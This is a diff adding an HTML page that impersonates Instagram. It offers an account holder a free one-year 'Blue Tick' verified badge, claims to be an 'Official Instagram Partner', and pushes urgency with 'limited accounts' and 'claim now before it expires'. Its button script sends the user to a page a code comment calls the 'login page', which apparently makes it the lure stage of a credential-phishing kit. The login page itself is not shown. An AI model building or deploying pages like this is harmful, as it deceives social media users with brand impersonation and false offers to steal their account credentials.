@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram • Verified</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background:#e5e5e5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    padding:20px 0;
+  }
+  .phone {
+    width:390px;
+    max-width:100vw;
+    background:#fff;
+    min-height:844px;
+    position:relative;
+    overflow:hidden;
+    box-shadow:0 0 30px rgba(0,0,0,0.2);
+    border-radius:40px;
+  }
+  .header {
+    background: linear-gradient(90deg, #833AB4, #E1306C, #FCAF45);
+    color:white;
+    padding:20px;
+    text-align:center;
+    font-size:18px;
+    font-weight:600;
+  }
+  .content {
+    padding:30px 24px;
+    text-align:center;
+  }
+  .badge {
+    width:120px;
+    height:120px;
+    background: #fff;
+    border:8px solid #0095f6;
+    border-radius:50%;
+    margin:20px auto;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:60px;
+    box-shadow:0 10px 30px rgba(0,149,246,0.3);
+  }
+  h1 {
+    font-size:26px;
+    margin:20px 0 10px;
+    color:#262626;
+  }
+  p {
+    color:#8a8a8a;
+    line-height:1.5;
+    margin-bottom:30px;
+  }
+  .btn {
+    width:100%;
+    background: linear-gradient(90deg, #0095f6, #00c2ff);
+    color:white;
+    border:none;
+    border-radius:30px;
+    padding:18px;
+    font-size:18px;
+    font-weight:700;
+    cursor:pointer;
+    margin-top:20px;
+  }
+  .note {
+    font-size:13px;
+    color:#8a8a8a;
+    margin-top:40px;
+  }
+  .verified {
+    color:#0095f6;
+    font-weight:700;
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+  <div class="header">Instagram Verified Program</div>
+  
+  <div class="content">
+    <div class="badge">✔️</div>
+    <h1>Get <span class="verified">Blue Tick</span> for FREE 1 Year!</h1>
+    <p>Congratulations @toxicadminn! You have been selected for Instagram's Official Verified Badge Program 2026.</p>
+    <p>Only limited accounts are eligible. Claim now before it expires.</p>
+    
+    <button class="btn" id="claimBtn">Claim Free Blue Tick Now</button>
+    
+    <div class="note">
+      🔒 Official Instagram Partner • No payment required<br>
+      Your account will be reviewed instantly after verification
+    </div>
+  </div>
+</div>
+
+<script>
+  document.getElementById('claimBtn').addEventListener('click', () => {
+    // Redirect to login page
+    window.location.href = "index.html";
+  });
+</script>
+</body>
+</html>
